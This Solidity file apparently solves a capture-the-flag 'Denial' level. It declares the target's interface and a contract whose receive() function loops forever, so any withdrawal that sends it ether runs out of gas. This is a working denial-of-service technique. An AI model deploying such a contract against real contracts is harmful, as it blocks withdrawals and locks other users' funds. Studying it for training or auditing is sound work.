// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

interface IDenial {
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
}

contract InfiniteLoop {

    receive() external payable {
        while(true) {
            
        }
    }
}